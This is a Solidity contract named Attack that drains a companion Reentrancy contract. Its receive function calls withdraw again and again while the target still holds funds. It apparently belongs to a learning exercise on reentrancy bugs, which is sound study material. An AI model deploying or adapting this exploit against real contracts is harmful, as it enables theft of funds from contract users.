// SPDX-License-Identifier: MIT

pragma solidity 0.8.19;

import { Reentrancy } from "./Reentrancy.sol";

contract Attack{
    address owner;
    Reentrancy VulnerableAddress;

    constructor(address _addr) payable {
        owner = msg.sender;
        VulnerableAddress = Reentrancy(_addr);
    }

    function onlyOwner() internal view {
        if (msg.sender != owner) revert ("Only owner can call this function");
    }


    function deposit() public {
        // onlyOwner();
        VulnerableAddress.deposit{value: 1 ether}();
    }


    function attack() public {
        onlyOwner();
        // revert("Wahala pro max");
        VulnerableAddress.withdraw(1 ether);
    }

    // fallback() payable external{
    //     onlyOwner();
    //     if (address(VulnerableAddress).balance > 1 ether) {
    //         VulnerableAddress.withdraw(1 ether);
    //         revert("NO chills");
    //     }
    // }

    receive() payable external {
        if (address(VulnerableAddress).balance > 1 ether) {
            VulnerableAddress.withdraw(1 ether);
        }
    }
}